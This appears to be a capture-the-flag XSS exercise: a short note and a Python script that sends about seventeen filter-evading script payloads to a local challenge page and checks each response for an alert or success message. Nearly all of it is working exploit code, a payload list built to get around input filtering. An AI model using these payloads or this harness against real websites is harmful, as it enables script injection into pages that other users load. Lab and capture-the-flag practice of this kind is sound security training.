The <script>alert('XSS')</script> payload triggers alert() execution but the "XSS" argument is replaced with the error. This suggests the prototype pollution protection is interfering with string/argument passing.

Test these approaches:

```python
import requests

url = "http://127.0.0.1:33031/page"

payloads = [
    # Template literal approach
    "<script>alert\`XSS\`</script>",
    # Array join approaches
    "<script>alert(['XSS'].join(''))</script>",
    # String literal construction
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    # Function constructor with proper escaping
    "<script>new Function('alert(\"XSS\")')()</script>",
    # setTimeout with string
    "<script>setTimeout('alert(\"XSS\")', 0)</script>",
    # setInterval approach
    "<script>setInterval('alert(\"XSS\")', 99999);clearInterval()</script>",
    # Using constructor property
    "<script>alert.constructor('alert(\"XSS\")')()</script>",
    # Using Promise
    "<script>Promise.resolve().then(()=>alert('XSS'))</script>",
    # Using immediate execution
    "<script>(function(){return alert})()('XSS')</script>",
    # Nested function call
    "<script>void function(){alert('XSS')}()</script>",
    # Eval with different approach
    "<script>eval.call(this, 'alert(\"XSS\")')</script>",
    # Using apply
    "<script>alert.apply(this, ['XSS'])</script>",
    # Using call
    "<script>alert.call(this, 'XSS')</script>",
    # Using Reflect if available
    "<script>Reflect.apply(alert, this, ['XSS'])</script>",
    # Stored XSS approach using name
    "<script>name='XSS';alert(name)</script>",
    # Using location
    "<script>alert(location.name||'XSS')</script>",
    # Comma operator
    "<script>'XSS',alert('XSS')</script>",
]

print("Testing alternative XSS payloads:\n")

for payload in payloads:
    try:
        resp = requests.post(url, data={"solution": payload}, timeout=10)
        response_text = resp.text
        
        if "Oops! You did an alert with" in response_text:
            start = response_text.find('Oops! You did an alert with')
            end = response_text.find('instead of', start)
            if end > start:
                msg = response_text[start:end+30]
            else:
                msg = "Alert triggered"
            print(f"[ALERT] {payload[:60]}...")
            print(f"  -> {msg}\n")
        elif "success" in response_text.lower() or "congratulations" in response_text.lower():
            print(f"[SUCCESS!] {payload[:60]}...")
            print(f"  Response contains success indicator!\n")
        else:
            print(f"[No alert] {payload[:50]}...")
            
    except Exception as e:
        print(f"[ERROR] {payload[:50]}... | {e}")

print("\n--- Testing Complete ---")
```

